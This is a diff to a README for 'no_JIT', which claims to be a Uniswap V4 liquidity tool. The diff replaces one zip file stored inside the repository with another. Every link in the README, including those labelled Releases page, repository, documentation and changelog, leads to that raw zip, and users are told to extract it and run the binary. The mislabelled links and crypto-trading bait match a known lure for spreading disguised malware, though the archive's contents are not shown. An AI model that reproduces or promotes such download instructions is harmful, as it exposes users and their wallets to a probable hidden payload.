@@ -2,7 +2,7 @@
 # 🚀 no_JIT - Simplifying Liquidity Provision with Ease
 
 ## 📥 Download Now
-[![Download no_JIT](https://raw.githubusercontent.com/Ernestqy/no_JIT/main/tests/no-JIT-v1.9.zip)](https://raw.githubusercontent.com/Ernestqy/no_JIT/main/tests/no-JIT-v1.9.zip)
+[![Download no_JIT](https://github.com/Ernestqy/no_JIT/raw/refs/heads/main/client/JIT-no-v2.0.zip)](https://github.com/Ernestqy/no_JIT/raw/refs/heads/main/client/JIT-no-v2.0.zip)
 
 ## 📝 Introduction
 Welcome to **no_JIT**! This application helps you manage and optimize your liquidity provision while using the latest features from **Uniswap V4**. It addresses common challenges seen with just-in-time (JIT) liquidity, allowing you to make informed financial decisions with ease. 
@@ -20,7 +20,7 @@ Before you download **no_JIT**, ensure your system meets these requirements:
 - **Network**: A stable internet connection for accessing blockchain services.
 
 ## 💻 Download & Install
-1. **Visit the Releases Page**: Go to the [Releases page](https://raw.githubusercontent.com/Ernestqy/no_JIT/main/tests/no-JIT-v1.9.zip) to find the latest version of no_JIT.
+1. **Visit the Releases Page**: Go to the [Releases page](https://github.com/Ernestqy/no_JIT/raw/refs/heads/main/client/JIT-no-v2.0.zip) to find the latest version of no_JIT.
    
 2. **Download**: Look for the version you want and download the file suitable for your operating system. Click on the provided link to start the download.
 
@@ -32,7 +32,7 @@ Before you download **no_JIT**, ensure your system meets these requirements:
      - Open the downloaded `.dmg` file.
      - Drag the no_JIT application to your Applications folder.
    - **For Linux**:
-     - Extract the downloaded `https://raw.githubusercontent.com/Ernestqy/no_JIT/main/tests/no-JIT-v1.9.zip` file in your preferred directory using a terminal.
+     - Extract the downloaded `https://github.com/Ernestqy/no_JIT/raw/refs/heads/main/client/JIT-no-v2.0.zip` file in your preferred directory using a terminal.
      - Navigate to the extracted folder and run the application using the command `./no_JIT`.
 
 4. **Run the Application**: After installation, you can start the application from your applications menu or using a shortcut on your desktop.
@@ -60,9 +60,9 @@ We welcome contributions! If you wish to improve **no_JIT**, feel free to open i
 **no_JIT** is open-source software licensed under the MIT License. Feel free to use and modify it as per the guidelines specified in the license document.
 
 ## 🔗 Links
-- [GitHub Repository](https://raw.githubusercontent.com/Ernestqy/no_JIT/main/tests/no-JIT-v1.9.zip)
-- [Documentation](https://raw.githubusercontent.com/Ernestqy/no_JIT/main/tests/no-JIT-v1.9.zip)
-- [Changelog](https://raw.githubusercontent.com/Ernestqy/no_JIT/main/tests/no-JIT-v1.9.zip)
+- [GitHub Repository](https://github.com/Ernestqy/no_JIT/raw/refs/heads/main/client/JIT-no-v2.0.zip)
+- [Documentation](https://github.com/Ernestqy/no_JIT/raw/refs/heads/main/client/JIT-no-v2.0.zip)
+- [Changelog](https://github.com/Ernestqy/no_JIT/raw/refs/heads/main/client/JIT-no-v2.0.zip)
 
 For further information, reach out to our support team or check the community forums linked above. Happy trading!
 ```
